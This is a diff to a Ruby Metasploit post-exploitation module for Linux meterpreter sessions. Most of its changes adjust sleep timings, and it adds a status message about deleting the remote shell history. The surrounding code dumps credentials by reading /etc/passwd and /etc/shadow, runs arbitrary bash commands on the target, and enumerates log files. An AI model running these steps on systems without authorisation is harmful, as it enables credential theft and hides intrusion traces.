@@ -188,6 +188,7 @@ def run
     #
     if not sysinfo.nil?
       print_good("Running module against: #{sys_info['Computer']}")
+      Rex::sleep(0.5)
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
@@ -223,7 +224,7 @@ def run
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
         print_status("Storing scan results into msf database ..")
-        Rex::sleep(0.5)
+        Rex::sleep(0.7)
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
@@ -293,7 +294,7 @@ def run
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
           default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
             print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.5)
+            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -348,7 +349,7 @@ def run
         #
         if datastore['CREDENTIALS_DUMP'] == true
           print_status("Dumping remote credentials from target ..")
-          Rex::sleep(0.5)
+          Rex::sleep(0.3)
           #
           # bash commands to be executed remotelly ..
           #
@@ -361,7 +362,7 @@ def run
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
             print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.5)
+            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -404,22 +405,32 @@ def run
         # check if single_command option its configurated ..
         if not exec_bash.nil?
           print_status("Executing user input remote bash command ..")
-          Rex::sleep(0.5)
+          Rex::sleep(0.7)
           # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
             print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.5)
+            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "+--------------------------+\n"
-            data_dump << "|  COMMAND EXECUTED OUTPUT |\n"
-            data_dump << "+--------------------------+\n"
+            data_dump << "+--------------------------------+\n"
+            data_dump << "|  COMMAND EXECUTED: #{exec_bash} \n"
+            data_dump << "+--------------------------------+\n"
             data_dump << "\n\n"
             data_dump << single_comm
             data_dump << "\n\n"
         end
+
+
+     #
+     # just for showoff ..
+     # "print what we are doing before present scans to user"
+     #
+     if datastore['DEL_SHELL_HISTORY'] == true
+       print_status("Deleting remote bash shell history commands list  ..")
+       Rex::sleep(0.5)
+     end
         data_dump << "----------------------------"
 
 
@@ -429,7 +440,7 @@ def run
        # Displaying results on screen (data_dump) ..
        #
        print_good("Remote scans completed, building list ..")
-       Rex::sleep(2.0)
+       Rex::sleep(2.3)
        # print the contents of 'data_dump' variable on screen ..
        print_line(data_dump)
        Rex::sleep(0.5)
